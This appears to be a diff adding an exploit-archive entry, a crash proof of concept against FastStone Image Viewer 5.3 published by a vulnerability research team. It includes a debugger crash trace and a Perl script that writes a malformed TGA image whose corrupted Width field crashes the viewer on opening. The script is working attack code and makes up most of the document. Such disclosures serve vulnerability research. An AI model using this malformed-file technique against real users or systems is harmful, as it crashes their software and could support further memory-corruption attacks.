@@ -1,0 +1,49 @@
+# Exploit Title         : FastStoneImage Viewer (Corrupted tga) IMAGESPECIFICATION.Width Crash POC
+# Product               : FastStoneImage Viewer
+# Date                  : 25.02.2015
+# Exploit Author        : ITDefensor Vulnerability Research Team http://itdefensor.ru/
+# Software Link         : http://www.faststone.org/FSViewerDownload.htm
+# Vulnerable version    : 5.3 (Latest at the moment) and probably previous versions
+# Vendor Homepage       : http://www.faststone.org/
+# Tested on             : FastStoneImage Viewer 5.3 installed on Windows 7 x64, Windows Server 2008
+# CVE                   : unknown at the moment
+#============================================================================================
+# Open created POC file (poc.tga) with FastStoneImage Viewer
+# Details
+#*** ERROR: Module load completed but symbols could not be loaded for image00000000`00400000
+#image00000000_00400000+0x9357:
+#00409357 893a            mov     dword ptr [edx],edi  ds:002b:00e00880=????????
+#0:000:x86> kb
+#ChildEBP RetAddr  Args to Child              
+#WARNING: Stack unwind information not available. Following frames may be wrong.
+#0018f688 004ff000 0018f6b4 00404619 0018f6ac image00000000_00400000+0x9357
+#0018f6ac 00425374 0018f6c0 0042537e 0018f6d8 image00000000_00400000+0xff000
+#0018f6d8 004255a2 0018f72c 0018f6f0 004256bb image00000000_00400000+0x25374
+#0018f72c 004257ee 0018f784 00425822 0018f758 image00000000_00400000+0x255a2
+#============================================================================================
+#!/usr/bin/perl -w
+
+	$tga_id = "tga poc example" ;
+	
+	$tga_header =		"\xf" .				#	IDLength
+						"\x00" .			#	ColorMapType
+						"\xa" ;				#	ImageType
+						
+	$tga_cms_spec =		"\x00\x00" .		#	FirstIndexEntry
+						"\x00\x00" .		#	ColorMapLength
+						"\x00" ;			#	ColorMapEntrySize
+	
+	$tga_image_spec =	"\x00\x00" .		#	XOrigin
+						"\x00\x00" .		#	YOrigin
+						"\x00\xa0" .		#	Width		<--- ! Incorrect field, leads to application crash
+						"\x80\x00" .		#	Height
+						"\x10" .			#	PixelDepth
+						"\x1" ;				#	ImageDescriptor
+						
+	$tga_file_header = $tga_header . $tga_cms_spec . $tga_image_spec . $tga_id ;				
+	$tga = $tga_file_header . "a" x 10000 ;
+	
+	open FILE, ">poc.tga"	or die("Can't open poc.tga\n") ;
+	binmode(FILE) ;
+	print FILE $tga ;
+	close FILE ;
